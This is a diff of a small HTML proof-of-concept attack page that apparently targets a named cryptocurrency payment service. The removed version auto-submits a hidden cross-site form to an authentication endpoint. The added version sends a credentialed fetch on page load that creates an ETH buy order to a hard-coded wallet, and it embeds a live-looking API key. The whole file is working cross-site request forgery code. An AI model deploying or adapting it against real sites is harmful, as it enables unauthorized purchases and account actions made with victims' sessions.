@@ -1,16 +1,30 @@
 <!DOCTYPE html>
-<html><head><meta charset="utf-8"><title>ATK-M4</title></head>
-<body>
-<iframe name="rf" id="rf" style="width:600px;height:200px;border:1px solid #ccc;"></iframe>
-<form id="f" method="POST" action="https://dashboard-api.swapped.com/api/v1/auth/csrf" enctype="multipart/form-data" target="rf">
-<input type="hidden" name="email" value="poc@test.com">
-</form>
+<html><head><meta charset="utf-8"><title>ATK-HL-ORDER</title></head>
+<body><pre id="out">HL-START</pre>
 <script>
-document.getElementById('f').submit();
-setTimeout(() => {
+(async () => {
   try {
-    document.title = "ATK-M4-" + (document.getElementById('rf').contentDocument?.body?.innerText?.slice(0,100) || "no-content");
-  } catch(e) { document.title = "ATK-M4-CROSS"; }
-}, 5000);
-</script>
-</body></html>
+    // Сначала получим CSRF (если нужен)
+    // Затем создадим ордер через POST
+    const body = {
+      currencyCode: "ETH",
+      walletAddress: "0x71C7656EC7ab88b098defB751B7401B5f6d8976F",
+      baseCurrencyCode: "USD",
+      baseCurrencyAmount: 100,
+      order_type: "buy",
+      apiKey: "pk_live_5cf10a0d2c6fffd8e92c8ee633b69b02"
+    };
+    const resp = await fetch("https://widget.swapped.com/api/v1/order/create_order", {
+      method: "POST",
+      credentials: "include",
+      headers: { "Content-Type": "text/plain" },
+      body: JSON.stringify(body)
+    });
+    document.title = "HL-" + resp.status;
+    document.getElementById("out").textContent = "HL-RESULT " + resp.status + " :: " + (await resp.text()).slice(0, 500);
+  } catch (e) {
+    document.title = "HL-ERR";
+    document.getElementById("out").textContent = "HL-ERR " + e.message;
+  }
+})();
+</script></body></html>
